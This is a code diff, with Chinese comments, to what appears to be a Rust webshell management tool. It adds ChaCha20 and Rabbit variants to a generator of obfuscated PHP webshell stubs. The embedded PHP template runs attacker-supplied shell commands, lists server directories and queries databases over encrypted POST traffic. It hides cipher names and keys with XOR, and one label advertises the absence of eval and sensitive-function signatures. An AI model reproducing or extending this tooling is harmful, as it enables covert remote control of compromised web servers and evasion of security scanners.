@@ -329,8 +329,8 @@ impl EncoderRegistry {
                 Box::new(NativeEncoder { crypto: "des" }),
                 Box::new(Aes128EcbEncoder),
                 Box::new(Aes128CbcEncoder),
-                Box::new(ChaCha20Encoder),
-                Box::new(RabbitEncoder),
+                Box::new(NativeEncoder { crypto: "chacha20" }),
+                Box::new(NativeEncoder { crypto: "rabbit" }),
             ],
         }
     }
@@ -1663,6 +1663,8 @@ function __DEC__($e,$k){$d=pack("H*",$e);return $d^str_pad('',strlen($d),$k);}
 $K=__DEC__('__KEYHEX__','__XK__');
 function __XOR__($d,$k){$o='';$n=strlen($d);for($i=0;$i<$n;$i++){$o.=$d[$i]^$k[$i%strlen($k)];}return $o;}
 
+/* 数据加解密算法（自实现） */
+__ALGO__
 /* 业务处理函数 */
 function __CMD__($c){global $_g;$o=@$_g[0]($c.' 2>&1');$d=@$_g[13]();return json_encode(array('ok'=>true,'data'=>array('stdout'=>$_g[2]((string)$o),'cwd'=>$d===false?'':$d)));}
 function __SCAN__($p){global $_g;$out=array();$items=@$_g[5]($p);if($items===false)return '{"ok":false,"error":"read dir failed"}';foreach($items as $f){if($f==='.'||$f==='..')continue;$full=rtrim($p,'/\\').DIRECTORY_SEPARATOR.$f;$isd=@$_g[6]($full);$out[]=array('name'=>$f,'path'=>$full,'is_dir'=>$isd,'size'=>$isd?0:@$_g[7]($full),'mtime'=>@$_g[8]($full));}return json_encode(array('ok'=>true,'data'=>array('entries'=>$out)));}
@@ -1679,7 +1681,7 @@ function __DBQ__($c,$q){$p=@json_decode($c,true);if(!is_array($p))return '{"ok":
 if(isset($_POST['formData'])){
     $b=is_string($_POST['formData'])?$_POST['formData']:'';
     $in=@$_g[1]($b);
-    $raw=__DECRYPT__;
+    __DECRYPT__
     $req=@json_decode($raw,true);
     if(!is_array($req)){$out='{"ok":false,"error":"bad params"}';}
     else{
@@ -1697,7 +1699,7 @@ if(isset($_POST['formData'])){
         elseif($h==__H_DBPROBE__){$out=__DBP__(isset($req['c'])?(string)$req['c']:'');}
         elseif($h==__H_DBQUERY__){$out=__DBQ__(isset($req['c'])?(string)$req['c']:'',isset($req['q'])?(string)$req['q']:'');}
     }
-    $enc=__ENCRYPT__;
+    __ENCRYPT__
     echo json_encode(array('data'=>$enc,'code'=>200));
 }
 "#;
@@ -1723,6 +1725,8 @@ impl PayloadEncoder for NativeEncoder {
             "aes_ecb" => "native_aes_ecb",
             "aes_cbc" => "native_aes_cbc",
             "des" => "native_des",
+            "chacha20" => "native_chacha20",
+            "rabbit" => "native_rabbit",
             _ => "native",
         }
     }
@@ -1732,6 +1736,8 @@ impl PayloadEncoder for NativeEncoder {
             "aes_ecb" => "NATIVE·AES-128-ECB（内置分发 + AES 载荷加密）",
             "aes_cbc" => "NATIVE·AES-128-CBC（内置分发 + AES 载荷加密）",
             "des" => "NATIVE·DES-ECB（内置分发 + DES 载荷加密）",
+            "chacha20" => "NATIVE·CHACHA20（内置分发 + 自实现现代流密码）",
+            "rabbit" => "NATIVE·RABBIT（内置分发 + 自实现现代流密码）",
             _ => "NATIVE（内置分发，无 eval / 无敏感函数特征）",
         }
     }
@@ -1749,6 +1755,26 @@ impl PayloadEncoder for NativeEncoder {
             "des" => {
                 let cipher = des_ecb_encrypt(code.as_bytes(), &des_key(password));
                 base64::engine::general_purpose::STANDARD.encode(cipher)
+            }
+            "chacha20" => {
+                let key = md5_hex(password).into_bytes();
+                let mut nonce = [0u8; 12];
+                nonce.copy_from_slice(&uuid::Uuid::new_v4().as_bytes()[..12]);
+                let ct = crate::crypto::chacha20_xor(&key, &nonce, 0, code.as_bytes());
+                let mut raw = Vec::with_capacity(12 + ct.len());
+                raw.extend_from_slice(&nonce);
+                raw.extend_from_slice(&ct);
+                base64::engine::general_purpose::STANDARD.encode(&raw)
+            }
+            "rabbit" => {
+                let key = md5_bytes(password);
+                let mut iv = [0u8; 8];
+                iv.copy_from_slice(&uuid::Uuid::new_v4().as_bytes()[..8]);
+                let ct = crate::crypto::rabbit_xor(&key, &iv, 0, code.as_bytes());
+                let mut raw = Vec::with_capacity(8 + ct.len());
+                raw.extend_from_slice(&iv);
+                raw.extend_from_slice(&ct);
+                base64::engine::general_purpose::STANDARD.encode(&raw)
             }
             _ => {
                 let key = md5_hex(password).into_bytes();
@@ -1771,6 +1797,25 @@ impl PayloadEncoder for NativeEncoder {
             "aes_ecb" => aes_ecb_decrypt(&raw, &aes_key(password)),
             "aes_cbc" => aes_cbc_decrypt(&raw, &aes_key(password), &aes_iv(password)),
             "des" => des_ecb_decrypt(&raw, &des_key(password)),
+            "chacha20" => {
+                if raw.len() < 12 {
+                    return Err(ProtocolError::ParseError("响应载荷过短".to_string()));
+                }
+                let (nonce, ct) = raw.split_at(12);
+                Ok(crate::crypto::chacha20_xor(
+                    &md5_hex(password).into_bytes(),
+                    nonce,
+                    1,
+                    ct,
+                ))
+            }
+            "rabbit" => {
+                if raw.len() < 8 {
+                    return Err(ProtocolError::ParseError("响应载荷过短".to_string()));
+                }
+                let (iv, ct) = raw.split_at(8);
+                Ok(crate::crypto::rabbit_xor(&md5_bytes(password), iv, 64, ct))
+            }
             _ => {
                 let key = md5_hex(password).into_bytes();
                 Ok(raw.iter().enumerate().map(|(i, b)| b ^ key[i % key.len()]).collect())
@@ -1826,8 +1871,8 @@ impl PayloadEncoder for NativeEncoder {
                         let cipher = xor_hex("AES-128-ECB", &ck);
                         let key = xor_hex(&md5_hex(password)[..16], &xk);
                         (
-                            format!("@$_g[16]($b,__DEC__('{cipher}','{ck}'),__DEC__('{key}','{xk}'))"),
-                            format!("@$_g[17]($out,__DEC__('{cipher}','{ck}'),__DEC__('{key}','{xk}'))"),
+                            format!("$raw=@$_g[16]($b,__DEC__('{cipher}','{ck}'),__DEC__('{key}','{xk}'));"),
+                            format!("$enc=@$_g[17]($out,__DEC__('{cipher}','{ck}'),__DEC__('{key}','{xk}'));"),
                             vec![("ae4975ad", 16), ("62f98eda", 17)],
                         )
                     }
@@ -1837,8 +1882,8 @@ impl PayloadEncoder for NativeEncoder {
                         let key = xor_hex(&md5_hex(password)[..16], &xk);
                         let iv = xor_hex(&md5_hex(password)[16..], &xk);
                         (
-                            format!("@$_g[16]($b,__DEC__('{cipher}','{ck}'),__DEC__('{key}','{xk}'),0,__DEC__('{iv}','{xk}'))"),
-                            format!("@$_g[17]($out,__DEC__('{cipher}','{ck}'),__DEC__('{key}','{xk}'),0,__DEC__('{iv}','{xk}'))"),
+                            format!("$raw=@$_g[16]($b,__DEC__('{cipher}','{ck}'),__DEC__('{key}','{xk}'),0,__DEC__('{iv}','{xk}'));"),
+                            format!("$enc=@$_g[17]($out,__DEC__('{cipher}','{ck}'),__DEC__('{key}','{xk}'),0,__DEC__('{iv}','{xk}'));"),
                             vec![("ae4975ad", 16), ("62f98eda", 17)],
                         )
                     }
@@ -1847,14 +1892,42 @@ impl PayloadEncoder for NativeEncoder {
                         let cipher = xor_hex("DES-ECB", &ck);
                         let key = xor_hex(&md5_hex(password)[..8], &xk);
                         (
-                            format!("@$_g[16]($b,__DEC__('{cipher}','{ck}'),__DEC__('{key}','{xk}'))"),
-                            format!("@$_g[17]($out,__DEC__('{cipher}','{ck}'),__DEC__('{key}','{xk}'))"),
+                            format!("$raw=@$_g[16]($b,__DEC__('{cipher}','{ck}'),__DEC__('{key}','{xk}'));"),
+                            format!("$enc=@$_g[17]($out,__DEC__('{cipher}','{ck}'),__DEC__('{key}','{xk}'));"),
                             vec![("ae4975ad", 16), ("62f98eda", 17)],
                         )
                     }
+                    "chacha20" => {
+                        let key_enc = xor_hex(&md5_hex(password), &xk);
+                        (
+                            format!(
+                                "$nonce=substr($in,0,12);$raw={{prefix}}chacha({{prefix}}dec('{key_enc}','{xk}'),$nonce,0,substr($in,12));"
+                            ),
+                            format!(
+                                "$nonce=substr($in,0,12);$enc=base64_encode($nonce.{{prefix}}chacha({{prefix}}dec('{key_enc}','{xk}'),$nonce,1,$out));"
+                            ),
+                            vec![],
+                        )
+                    }
+                    "rabbit" => {
+                        let key_hex = md5_bytes(password)
+                            .iter()
+                            .map(|b| format!("{b:02x}"))
+                            .collect::<String>();
+                        let key_enc = xor_hex(&key_hex, &xk);
+                        (
+                            format!(
+                                "$iv=substr($in,0,8);$raw={{prefix}}rabbit(pack(\"H*\",{{prefix}}dec('{key_enc}','{xk}')),$iv,0,substr($in,8));"
+                            ),
+                            format!(
+                                "$iv=substr($in,0,8);$enc=base64_encode($iv.{{prefix}}rabbit(pack(\"H*\",{{prefix}}dec('{key_enc}','{xk}')),$iv,64,$out));"
+                            ),
+                            vec![],
+                        )
+                    }
                     _ => (
-                        "__XOR__($in,$K)".to_string(),
-                        "base64_encode(__XOR__($out,$K))".to_string(),
+                        "$raw=__XOR__($in,$K);".to_string(),
+                        "$enc=base64_encode(__XOR__($out,$K));".to_string(),
                         vec![],
                     ),
                 };
@@ -1869,11 +1942,18 @@ impl PayloadEncoder for NativeEncoder {
                 for (hash, index) in symbols {
                     table.push_str(&format!("    '{hash}' => {index},\n"));
                 }
+                let algo = match self.crypto {
+                    "chacha20" => chacha20_php_algo(&prefix),
+                    "rabbit" => rabbit_php_algo(&prefix),
+                    _ => String::new(),
+                };
                 Ok(tpl
                     .replace("__SYMBOLS__", &table)
+                    .replace("__ALGO__", &algo)
                     .replace("__DECRYPT__", &decrypt_expr)
                     .replace("__ENCRYPT__", &encrypt_expr)
                     // 注入的解密/加密表达式中的函数引用随前缀替换
+                    .replace("{prefix}", &prefix)
                     .replace("__XOR__", &format!("{prefix}xor"))
                     .replace("__DEC__", &format!("{prefix}dec")))
 
@@ -2157,8 +2237,9 @@ mod tests {
         assert_eq!(
             ids,
             vec![
-                "aes128_cbc", "aes128_ecb", "chacha20", "native",
-                "native_aes_cbc", "native_aes_ecb", "native_des", "rabbit",
+                "aes128_cbc", "aes128_ecb", "native", "native_aes_cbc",
+                "native_aes_ecb", "native_chacha20", "native_des",
+                "native_rabbit",
             ],
             "注册表应暴露 NATIVE 系列 + 两个自加密编码器（PHP5 兼容）"
         );
@@ -2400,162 +2481,4 @@ function {p}rx(&$x, $c) {{
 "#,
         p = prefix
     )
-}
-
-pub struct ChaCha20Encoder;
-
-impl PayloadEncoder for ChaCha20Encoder {
-    fn id(&self) -> &'static str {
-        "chacha20"
-    }
-
-    fn display_name(&self) -> &'static str {
-        "CHACHA20（自实现现代流密码 · RFC 8439 · 自加密）"
-    }
-
-    fn encode(&self, code: &str, password: &str) -> String {
-        let key = md5_hex(password).into_bytes();
-        let mut nonce = [0u8; 12];
-        nonce.copy_from_slice(&uuid::Uuid::new_v4().as_bytes()[..12]);
-        let ct = crate::crypto::chacha20_xor(&key, &nonce, 0, code.as_bytes());
-        let mut raw = Vec::with_capacity(12 + ct.len());
-        raw.extend_from_slice(&nonce);
-        raw.extend_from_slice(&ct);
-        base64::engine::general_purpose::STANDARD.encode(&raw)
-    }
-
-    fn decode(&self, payload: &str, password: &str) -> Result<Vec<u8>, ProtocolError> {
-        let raw = base64::engine::general_purpose::STANDARD
-            .decode(payload)
-            .map_err(|_| ProtocolError::ParseError("响应 Base64 解码失败".to_string()))?;
-        if raw.len() < 12 {
-            return Err(ProtocolError::ParseError("响应载荷过短".to_string()));
-        }
-        let (nonce, ct) = raw.split_at(12);
-        Ok(crate::crypto::chacha20_xor(
-            &md5_hex(password).into_bytes(),
-            nonce,
-            1,
-            ct,
-        ))
-    }
-
-    fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
-        self.stub_session(language, password)
-    }
-
-    fn stub_session(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
-        match language {
-            "php" => {
-                let xk = php_ident();
-                let key = md5_hex(password);
-                let key_enc = xor_hex(&key, &xk);
-                let unpack = format!(
-                    "    $key = __PREFIX__dec('{key_enc}', '{xk}');\n    \
-                     $raw = @$_g[1]($payload);\n    \
-                     $nonce = substr($raw, 0, 12);\n    \
-                     $out = __PREFIX__chacha($key, $nonce, 0, substr($raw, 12));\n    \
-                     $GLOBALS['__PREFIX__n'] = $nonce;"
-                );
-                let pack = format!(
-                    "    $key = __PREFIX__dec('{key_enc}', '{xk}');\n    \
-                     $nonce = isset($GLOBALS['__PREFIX__n']) ? $GLOBALS['__PREFIX__n'] : '';\n    \
-                     $out = base64_encode($nonce . __PREFIX__chacha($key, $nonce, 1, $data));"
-                );
-                let store = format!(
-                    "    $key = __PREFIX__dec('{key_enc}', '{xk}');\n    \
-                     $nonce = isset($GLOBALS['__PREFIX__n']) ? $GLOBALS['__PREFIX__n'] : '';\n    \
-                     $out = base64_encode($nonce . __PREFIX__chacha($key, $nonce, 0, $data));"
-                );
-                Ok(session_php_stub(
-                    &[(1, "base64_decode")],
-                    &unpack,
-                    &pack,
-                    &chacha20_php_algo("__PREFIX__"),
-                    &store,
-                ))
-            }
-            other => Err(ProtocolError::NotSupported(format!(
-                "该编码器暂仅支持 PHP（{other} 待实现）"
-            ))),
-        }
-    }
-}
-
-pub struct RabbitEncoder;
-
-impl PayloadEncoder for RabbitEncoder {
-    fn id(&self) -> &'static str {
-        "rabbit"
-    }
-
-    fn display_name(&self) -> &'static str {
-        "RABBIT（自实现现代流密码 · RFC 4503 · 自加密）"
-    }
-
-    fn encode(&self, code: &str, password: &str) -> String {
-        let key = md5_bytes(password);
-        let mut iv = [0u8; 8];
-        iv.copy_from_slice(&uuid::Uuid::new_v4().as_bytes()[..8]);
-        let ct = crate::crypto::rabbit_xor(&key, &iv, 0, code.as_bytes());
-        let mut raw = Vec::with_capacity(8 + ct.len());
-        raw.extend_from_slice(&iv);
-        raw.extend_from_slice(&ct);
-        base64::engine::general_purpose::STANDARD.encode(&raw)
-    }
-
-    fn decode(&self, payload: &str, password: &str) -> Result<Vec<u8>, ProtocolError> {
-        let raw = base64::engine::general_purpose::STANDARD
-            .decode(payload)
-            .map_err(|_| ProtocolError::ParseError("响应 Base64 解码失败".to_string()))?;
-        if raw.len() < 8 {
-            return Err(ProtocolError::ParseError("响应载荷过短".to_string()));
-        }
-        let (iv, ct) = raw.split_at(8);
-        Ok(crate::crypto::rabbit_xor(&md5_bytes(password), iv, 64, ct))
-    }
-
-    fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
-        self.stub_session(language, password)
-    }
-
-    fn stub_session(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
-        match language {
-            "php" => {
-                let xk = php_ident();
-                let key_hex = md5_bytes(password)
-                    .iter()
-                    .map(|b| format!("{b:02x}"))
-                    .collect::<String>();
-                let key_enc = xor_hex(&key_hex, &xk);
-                let unpack = format!(
-                    "    $key = pack(\"H*\", __PREFIX__dec('{key_enc}', '{xk}'));\n    \
-                     $raw = @$_g[1]($payload);\n    \
-                     $iv = substr($raw, 0, 8);\n    \
-                     $out = __PREFIX__rabbit($key, $iv, 0, substr($raw, 8));\n    \
-                     $GLOBALS['__PREFIX__n'] = $iv;"
-                );
-                let pack = format!(
-                    "    $key = pack(\"H*\", __PREFIX__dec('{key_enc}', '{xk}'));\n    \
-                     $iv = isset($GLOBALS['__PREFIX__n']) ? $GLOBALS['__PREFIX__n'] : '';\n    \
-                     $out = base64_encode($iv . __PREFIX__rabbit($key, $iv, 64, $data));"
-                );
-                let store = format!(
-                    "    $key = pack(\"H*\", __PREFIX__dec('{key_enc}', '{xk}'));\n    \
-                     $iv = isset($GLOBALS['__PREFIX__n']) ? $GLOBALS['__PREFIX__n'] : '';\n    \
-                     $out = base64_encode($iv . __PREFIX__rabbit($key, $iv, 0, $data));"
-                );
-                Ok(session_php_stub(
-                    &[(1, "base64_decode")],
-                    &unpack,
-                    &pack,
-                    &rabbit_php_algo("__PREFIX__"),
-                    &store,
-                ))
-            }
-            other => Err(ProtocolError::NotSupported(format!(
-                "该编码器暂仅支持 PHP（{other} 待实现）"
-            ))),
-        }
-    }
 }
